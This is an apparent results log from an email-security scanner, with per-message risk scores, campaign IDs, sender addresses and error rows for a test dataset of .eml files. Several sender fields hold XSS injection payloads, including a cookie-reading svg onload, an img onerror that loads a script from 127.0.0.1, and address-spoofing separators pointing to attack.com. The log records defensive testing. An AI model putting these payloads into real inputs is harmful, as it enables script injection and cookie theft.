filename,status,ground_truth,risk_score,severity,recommended_action,anomaly_score,detection_score,attribution_country,attribution_confidence,campaign_id,healing_applied,from_addr,spf,dkim,dmarc,elapsed_ms,explanation,error,timestamp,file
dc713194e90889863b2d2a7458ef7318.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.8,,False,Stacie Henry <comparehoofs@execs.com>,,,,32.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.213463,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\dc713194e90889863b2d2a7458ef7318.eml
09d0b3d7b86c7cb18fedc52cc087f26d.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,23.6,,False,"""remove@pyropictures.com""",,,,32.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.217096,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\09d0b3d7b86c7cb18fedc52cc087f26d.eml
3c7980aebaf2cb4698eb3e1d9a550ab3.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,19.4,CAMP-8D2FFC0E,False,admin@security.aol.com,,,,32.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.220653,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\3c7980aebaf2cb4698eb3e1d9a550ab3.eml
8daab9e864388c430cc7f494496480ce.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,14.3,,False,aaa7info@polisen.nu,,,,27.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.232599,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8daab9e864388c430cc7f494496480ce.eml
6487859ceec2a31719ab1a0bb16379e2.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,TransWest Credit Union <security@transwestcu.com>,,,,40.4,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.224143,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\6487859ceec2a31719ab1a0bb16379e2.eml
b524b85a20c24795552b920b51ff6422.eml,ERROR,,,,,,,,,,,,,,,31.7,,HTTP_500,2026-09-22T11:31:23.234917,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b524b85a20c24795552b920b51ff6422.eml
646a25f54b2b9f066543e17da3d9da71.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,20.7,,False,Geocaching Notify Bot <notify@geocaching.com>,,,,72.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.199878,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\646a25f54b2b9f066543e17da3d9da71.eml
b52199cd0d1c31cd72b4f1ef9a8f0efc.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,"""gnichols@bccb.com""",,,,68.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.209010,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b52199cd0d1c31cd72b4f1ef9a8f0efc.eml
8d825482bd823a023a10aceef7499f2e.eml,ERROR,,,,,,,,,,,,,,,74.5,,HTTP_500,2026-09-22T11:31:23.206139,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8d825482bd823a023a10aceef7499f2e.eml
09d4b56e09001b8122f707038b5b3d39.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,14.3,,False,"""test<IFRAME SRC=javascript""",,,,37.9,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.246151,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\09d4b56e09001b8122f707038b5b3d39.eml
3c7acd5d3bf3267c15a5e058ea10d34b.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Johnathon McKinley <johnathon.mcKinleyap@canarie.ca>,,,,37.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.249761,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\3c7acd5d3bf3267c15a5e058ea10d34b.eml
6496e1b950e719b806930dec152c0f1e.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Lucas Roberts <clanmatrix.com@pasaportemexico.com>,,,,36.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.253516,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\6496e1b950e719b806930dec152c0f1e.eml
b5310f099fff362c390ad51dbeb71daf.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,mike@venturing.net￿attack.com,,,,33.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.264570,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b5310f099fff362c390ad51dbeb71daf.eml
8dc252b3ceec64fa782b90a4996a8c0b.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.1,CAMP-1B66DEAA,False,"""erwollam@hotmail.com""",,,,42.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.260282,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8dc252b3ceec64fa782b90a4996a8c0b.eml
dc7986276860e46e33d5f1385cb793a8.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Bobby Prill <rprill@jhu.edu>,,,,40.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.266793,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\dc7986276860e46e33d5f1385cb793a8.eml
09de7a489c97b5c678d53d4abfd399ba.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Todd Stecher <todd.stecher@isilon.com>,,,,38.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.272156,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\09de7a489c97b5c678d53d4abfd399ba.eml
dc761f3e0c7a2b4acca436e3b7f34e79.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.7,,False,tbrown@hanover-co.com,,,,79.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.239488,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\dc761f3e0c7a2b4acca436e3b7f34e79.eml
8dd23072cd0ac9a4abecfb9fa15e7047.eml,ERROR,,,,,,,,,,,,,,,37.7,,HTTP_500,2026-09-22T11:31:23.284058,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8dd23072cd0ac9a4abecfb9fa15e7047.eml
b53139743aca89ca7c0ed2046da823f5.eml,ERROR,,,,,,,,,,,,,,,36.5,,HTTP_500,2026-09-22T11:31:23.287537,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b53139743aca89ca7c0ed2046da823f5.eml
dc87192b64d3f954335eb2606fd6a90a.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-713DA71D,False,"""test<img onerror=alert  src=x>@attack.com""",,,,37.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.290375,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\dc87192b64d3f954335eb2606fd6a90a.eml
3c866c678037bbcd615526dd863a1f32.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,langharn@maail.strose.edu,,,,30.9,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.302482,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\3c866c678037bbcd615526dd863a1f32.eml
09fdf9dfebcdb7b4fc3c8e1cf25ec1ea.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-73950467,False,"""test<img src=xx:x onerror=d=document;e=d.createElement('script');e.src='http://127.0.0.1/i.js';d.body.appendChild(e);>@attack.com""",,,,39.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.297635,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\09fdf9dfebcdb7b4fc3c8e1cf25ec1ea.eml
64a6f4da01c14c5a21088d27018e7961.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.7,,False,paul.v.tebo@usa.dupont.com}attack.com,,,,39.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.306982,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\64a6f4da01c14c5a21088d27018e7961.eml
8dd4b5d43bf7b388238b7c85459b3fe8.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Lashawna Girlie <verticalcreams@rc-ynb.com>,,,,38.5,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.310864,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8dd4b5d43bf7b388238b7c85459b3fe8.eml
3c839540a6062e4a5df1bc0d3b94f47e.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-17F65C98,False,"""s..shively@enron.com"" <>, test@attack.com",,,,76.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.277351,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\3c839540a6062e4a5df1bc0d3b94f47e.eml
649e07e1e8ff72ae8b348e57d070e164.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Darill Bryant <walidmr@bar-plate.com>,,,,77.8,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.280822,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\649e07e1e8ff72ae8b348e57d070e164.eml
dc8c91939717886a69aed366191b2803.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,17.5,,False,registrar@amunet.edu,,,,46.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.321825,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\dc8c91939717886a69aed366191b2803.eml
0a06c5fb825b6ba9601e46a1093081fa.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-645BA5EF,False,"""test<img src=mail.qq.com/filename=qqmailtest.swf></img>@attack.com""",,,,47.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.324238,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\0a06c5fb825b6ba9601e46a1093081fa.eml
3c8831759cba00ef3be11f151a276696.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.7,CAMP-89CEBC17,False,test@attack.com,,,,56.9,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.327802,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\3c8831759cba00ef3be11f151a276696.eml
8dd4f45d1ca411082635975c1a4b3b01.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,15.1,,False,s.kent.williams@williams.com,,,,52.9,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.336727,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8dd4f45d1ca411082635975c1a4b3b01.eml
64a747c258b97dd77f92d16e51cad1ff.eml,ERROR,,,,,,,,,,,,,,,58.6,,HTTP_500,2026-09-22T11:31:23.333386,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\64a747c258b97dd77f92d16e51cad1ff.eml
b53b71912f43fa2104355d284626eede.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Eugene Kosov <kosov@rbc.ru>,,,,51.0,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.346024,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b53b71912f43fa2104355d284626eede.eml
dc8f1d540120b226a4c805b3dccfbd84.eml,ERROR,,,,,,,,,,,,,,,49.4,,HTTP_500,2026-09-22T11:31:23.349431,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\dc8f1d540120b226a4c805b3dccfbd84.eml
0a0eae454bfd4e4c59b92f014927dc35.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Dane <dpaygkur@agenda.net>,,,,47.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.354014,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\0a0eae454bfd4e4c59b92f014927dc35.eml
b53573c4b99b51de87ac8448d723154c.eml,ERROR,,,,,,,,,,,,,,,84.2,,HTTP_500,2026-09-22T11:31:23.319347,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b53573c4b99b51de87ac8448d723154c.eml
64a7a00ada7a2b3d704fb62508d1681b.eml,ERROR,,,,,,,,,,,,,,,37.7,,HTTP_500,2026-09-22T11:31:23.367853,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\64a7a00ada7a2b3d704fb62508d1681b.eml
8dd6a5e4c4dcd59e5178c097be0e2b02.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,<rdnp@spacecamp.com>,,,,37.4,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.371422,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8dd6a5e4c4dcd59e5178c097be0e2b02.eml
b56ffa2a785dd874e39168225cdb6b65.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,18.3,,False,mzeleanor@juno.com attack.com,,,,28.5,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.384794,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\b56ffa2a785dd874e39168225cdb6b65.eml
0a231124a649cb962793a9061abb6b65.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Sales <sales@soltechconsulting.com>,,,,24.3,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.392041,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\0a231124a649cb962793a9061abb6b65.eml
dc99993cd876e4b541734c259eea5dbb.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,CAMP-A63D2A92,False,"""test<svg onload=alert(document.cookie)>@attack.com""",,,,30.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.389658,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\dc99993cd876e4b541734c259eea5dbb.eml
3c90b6709fce6dd3df837868cf70d95f.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,15.1,,False,Kevin Viel <kviel@sfbrgenetics.org>,,,,25.7,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.397007,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\3c90b6709fce6dd3df837868cf70d95f.eml
3c8c7207308b78f1bdfa0c22e1a2005c.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,19.4,CAMP-5BAE791E,False,admin@security.gte.net,,,,68.6,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.358672,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\3c8c7207308b78f1bdfa0c22e1a2005c.eml
64aac3761f30d270cc993b579f4ae386.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,20.7,,False,g111@mail.yahoo.co.jp,,,,32.2,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.398932,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\64aac3761f30d270cc993b579f4ae386.eml
dca1eefaa7a7412df68f63d1e59a3cc1.eml,ERROR,,,,,,,,,,,,,,,27.2,,HTTP_500,2026-09-22T11:31:23.405633,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\dca1eefaa7a7412df68f63d1e59a3cc1.eml
8de463ec46440a217802326a99407dba.eml,OK,,43.0,MEDIUM,REVIEW,0.1,65,,14.3,CAMP-DDBFE4AF,False,Linux-Announce-Request@test.mit.edu,,,,29.5,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.408836,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\8de463ec46440a217802326a99407dba.eml
0a3bc8702e08c9a3ff7458d36c0f2aa7.eml,OK,,28.0,MEDIUM,REVIEW,0.1,40,,14.3,,False,"""test<span style=font-family""",,,,28.1,"We noticed this is a first-time sender or was sent at an atypical hour compared to your normal schedule. The message is available in your inbox, but take a quick look to ensure the request is legitima",,2026-09-22T11:31:23.413341,D:\sentinal\EPVME-Dataset-main\EPVME-Dataset-main\3\0a3bc8702e08c9a3ff7458d36c0f2aa7.eml
